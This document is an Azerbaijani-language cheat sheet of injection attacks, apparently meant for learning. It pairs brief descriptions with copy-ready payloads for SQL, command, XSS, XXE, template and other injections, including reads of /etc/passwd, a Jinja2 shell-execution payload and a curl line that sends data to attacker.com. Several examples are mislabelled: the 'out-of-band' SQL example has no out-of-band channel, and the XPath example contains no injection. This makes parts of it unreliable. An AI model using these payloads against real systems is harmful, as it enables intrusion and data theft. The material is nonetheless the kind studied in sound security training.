# Bütün Injection Tipləri

## 1. SQL Injection (SQLi)
SQL Injection, istifadəçinin daxil etdiyi məlumatın SQL sorğusunda icra olunmasına səbəb olur.

### 1.1. Classic SQL Injection
Düzgün sanitizasiya olunmamış istifadəçi girişi ilə SQL sorğusunun manipulyasiyası.
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1';
```

### 1.2. Blind SQL Injection
Sayt səhv mesajı qaytarmasa da, sorğunun nəticəsindən asılı olaraq fərqli cavablar qaytarır.
- **Boolean-based:**
```sql
' OR 1=1 --
```
- **Time-based:**
```sql
' OR IF(1=1, SLEEP(5), 0) --
```

### 1.3. Error-based SQL Injection
SQL səhvlərindən istifadə edərək məlumat çıxarmaq.
```sql
' UNION SELECT 1, database(), user(); --
```

### 1.4. Union-based SQL Injection
`UNION` ifadəsi vasitəsilə başqa bir sorğu nəticəsini birləşdirmək.
```sql
' UNION SELECT null, username, password FROM users --
```

### 1.5. Out-of-band SQL Injection
Daxili sorğularla məlumatın xarici serverə göndərilməsi.
```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --
```

## 2. NoSQL Injection
SQL olmayan verilənlər bazalarında hücum etmək üçün istifadə edilir.
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

## 3. Command Injection
Sistemdə əmrlər icra etməyə imkan verir.
```sh
; cat /etc/passwd
```

## 4. OS Command Injection
OS Command Injection, istifadəçinin daxil etdiyi məlumatın əməliyyat sistemi əmr sətrində icra olunmasına imkan verir.

### 4.1. Basic OS Command Injection
```sh
ping -c 4 127.0.0.1; cat /etc/passwd
```

### 4.2. Blind OS Command Injection
```sh
127.0.0.1 && sleep 10
```

### 4.3. Out-of-band OS Command Injection
```sh
curl http://attacker.com/?data=$(whoami)
```

## 5. LDAP Injection
LDAP sorğularını manipulyasiya edərək istifadəçi identifikasiyasını keçmək.
```ldap
*)(uid=*))(|(uid=*
```

## 6. XPath Injection
XML verilənlər bazasında axtarış sistemlərini aldadaraq giriş əldə etmək.
```xpath
/users/user[username/text()='admin' and password/text()='1234']
```

## 7. XSS (Cross-Site Scripting)
JavaScript kodunun icra edilməsinə səbəb olur.

### 7.1. Stored XSS
```html
<script>alert('Hacked');</script>
```

### 7.2. Reflected XSS
```html
<input type="text" value="<script>alert('XSS');</script>">
```

### 7.3. DOM-based XSS
```javascript
var evil = document.location.hash.substr(1);
document.write(evil);
```

## 8. HTML Injection
HTML strukturunu manipulyasiya edərək səhifənin tərkibini dəyişmək.
```html
<img src=x onerror=alert('Hacked')>
```

## 9. CRLF Injection
HTTP başlıqlarını dəyişmək üçün istifadə olunur.
```http
GET / HTTP/1.1\r\nSet-Cookie: admin=true
```

## 10. Email Header Injection (SMTP injection)
E-poçt başlıqlarını manipulyasiya edərək phishing hücumları etmək.
```txt
To: victim@example.com\r\nCC: attacker@example.com
```

## 11. Host Header Injection
Serverin `Host` başlığını dəyişərək zərərli URL-ləri yönləndirmək.
```http
Host: evil.com
```

## 12. XML Injection
XML sənədlərini manipulyasiya edərək məlumat oğurlamaq və ya sistemə müdaxilə etmək.
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

## 13. Template Injection
Şablon mühərriklərini manipulyasiya edərək kod icra etmək.
```jinja2
{{ self.__class__.__mro__[1].__subclasses__()[408]('id', shell=True).communicate() }}
```

## 14. Serialization Injection
Deserialization zamanı icra edilən kodları manipulyasiya etmək.
```php
O:4:"Test":1:{s:4:"data";s:5:"hacked";}
```

## 15. GraphQL Injection
GraphQL API-lərinə hücum edərək həssas məlumatları aşkar etmək.
```graphql
query { __schema { types { name } } }
```

